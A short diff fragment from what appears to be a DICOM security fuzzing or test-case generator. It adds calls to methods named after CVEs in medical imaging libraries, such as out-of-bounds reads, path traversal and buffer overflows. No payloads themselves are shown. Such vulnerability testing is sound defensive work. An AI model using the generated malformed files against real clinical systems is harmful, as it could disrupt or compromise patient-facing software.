         yield from cls.cve_2024_24793_duplicate_meta_tags()
         yield from cls.cve_2024_24794_sequence_duplicates()
         yield from cls.cve_2019_11687_polyglot()
+        yield from cls.cve_2026_3650_gdcm_vr_memory_leak()
+        yield from cls.cve_2026_5437_meta_header_oob()
+        yield from cls.cve_2026_10528_dcmitem_read_stack()
+        yield from cls.cve_2026_32711_dicomdir_traversal()
+        yield from cls.cve_2022_2121_null_deref()
+        yield from cls.cve_2025_14607_bytestring_corruption()
+        yield from cls.cve_2024_47796_determine_minmax_oob()
+        yield from cls.cve_2015_8979_dul_string_overflow()
 
 
 # =============================================================================
